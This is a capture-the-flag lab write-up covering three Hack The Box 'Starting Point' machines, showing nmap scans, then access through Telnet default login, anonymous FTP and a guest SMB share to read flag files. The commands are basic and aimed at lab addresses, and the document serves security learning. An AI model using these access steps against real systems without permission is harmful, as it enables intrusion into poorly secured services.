# HTB Starting Point Machines

Documented walkthroughs for the "Starting Point" series on Hack The Box.

---

## 🐱 Meow
**Protocol:** Telnet  
**IP Address:** 10.129.1.17  
**Summary:** Discovered open Telnet port with Nmap. Used default login to access the system and read the flag.

### 🔍 Enumeration
```bash
ping 10.129.1.17
nmap 10.129.1.17
```
📸 ![](../HTB_Academy/screenshots/meow_ping_nmap_results.png)

### 💻 Exploitation
```bash
telnet 10.129.1.17
```
📸 ![](../HTB_Academy/screenshots/meow_telnet_success.png)

### 🏁 Flag
```bash
cat flag.txt
```
📸 ![](../HTB_Academy/screenshots/meow_explored_flag_capture.png)

### ✅ Pwned!
📸 ![](../HTB_Academy/screenshots/meow_pwned.png)

---

## 🦌 Fawn
**Protocol:** FTP  
**IP Address:** 10.129.75.79  
**Summary:** Anonymous FTP login allowed access to `flag.txt`.

### 🔍 Enumeration
```bash
ping 10.129.75.79
nmap 10.129.75.79
```
📸 ![](../HTB_Academy/screenshots/fawn_ping_nmap_results.png)

### 💻 Exploitation
```bash
ftp 10.129.75.79
# login as anonymous
get flag.txt
```
📸 ![](../HTB_Academy/screenshots/fawn_ftp_success_flag_located.png)  
📸 ![](../HTB_Academy/screenshots/fawn_get_flag_catpured.png)

### ✅ Pwned!
📸 ![](../HTB_Academy/screenshots/fawn_pwned.png)

---

## 💃 Dancing
**Protocol:** SMB  
**IP Address:** 10.129.1.12  
**Summary:** Found readable share via SMB. Navigated directories using `smbclient` and retrieved flag.

### 🔍 Enumeration
```bash
nmap 10.129.1.12
smbclient -L 10.129.1.12
```
📸 ![](../HTB_Academy/screenshots/dancing_nmap_results.png)  
📸 ![](../HTB_Academy/screenshots/dancing_smb_results.png)

### 💻 Exploitation
```bash
smbclient //10.129.1.12/WorkShares -U guest
cd James.P
get flag.txt
```
📸 ![](../HTB_Academy/screenshots/dancing_flag_located.png)  
📸 ![](../HTB_Academy/screenshots/dancing_flag_catpure.png)

### ✅ Pwned!
📸 ![](../HTB_Academy/screenshots/dancing_pwned.png)
